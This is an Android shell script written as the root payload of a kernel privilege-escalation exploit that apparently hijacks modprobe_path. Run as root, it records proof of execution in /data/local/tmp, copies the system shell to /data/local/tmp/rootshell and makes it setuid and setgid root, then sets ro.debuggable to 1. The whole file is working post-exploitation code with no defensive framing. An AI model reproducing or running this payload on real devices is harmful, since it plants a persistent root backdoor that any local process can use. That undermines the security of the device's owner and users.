#!/system/bin/sh
# Root payload - executed by kernel as root via modprobe_path
# Log to a file so we can verify it ran
echo "ROOTED at $(date)" > /data/local/tmp/rooted.txt
id >> /data/local/tmp/rooted.txt 2>&1

# Create suid root shell
cp /system/bin/sh /data/local/tmp/rootshell
chmod 6755 /data/local/tmp/rootshell
chown root:root /data/local/tmp/rootshell
echo "rootshell created" >> /data/local/tmp/rooted.txt
ls -l /data/local/tmp/rootshell >> /data/local/tmp/rooted.txt 2>&1

# Also try to set props or do other root things
setprop ro.debuggable 1 2>/dev/null
